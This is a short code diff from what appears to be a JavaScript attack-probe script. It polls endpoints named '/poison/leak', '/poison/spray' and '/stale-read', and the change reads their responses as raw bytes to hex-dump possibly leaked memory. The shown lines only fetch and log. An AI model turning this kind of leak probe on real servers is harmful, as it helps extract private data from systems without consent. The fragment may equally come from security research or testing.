@@ -757,18 +757,18 @@ async function run() {
     let endpoints = ['/poison/leak', '/poison/info', '/poison/spray', '/stale-read'];
     for (let ep of endpoints) {
         try {
-            let r = await fetch(S + ep);
-            let t = await r.text();
+            let r = await fetch(S + ep, {headers: {'Accept': 'application/octet-stream'}});
+            let buf = await r.arrayBuffer();
+            let t = new Uint8Array(buf);
             let nonAscii = 0, hexPreview = '';
             for (let j = 0; j < Math.min(80, t.length); j++) {
-                let c = t.charCodeAt(j);
-                if (c < 32 || c > 126) nonAscii++;
-                hexPreview += c.toString(16).padStart(2,'0') + ' ';
+                if (t[j] < 32 || t[j] > 126) nonAscii++;
+                hexPreview += t[j].toString(16).padStart(2,'0') + ' ';
             }
-            log('[+] ' + ep + ': ' + t.length + ' chars, ' + nonAscii + ' non-ASCII', t.length > 0 ? '' : 'warn');
+            log('[+] ' + ep + ': ' + t.length + ' bytes, ' + nonAscii + ' non-ASCII', t.length > 0 ? '' : 'warn');
             log('    hex: ' + hexPreview.slice(0, 240), 'info');
         } catch(e) {
-            log('[-] ' + ep + ': ' + e.message, 'err');
+            log('[-] ' + ep + ': ' + e.name + ': ' + e.message, 'err');
         }
     }
 
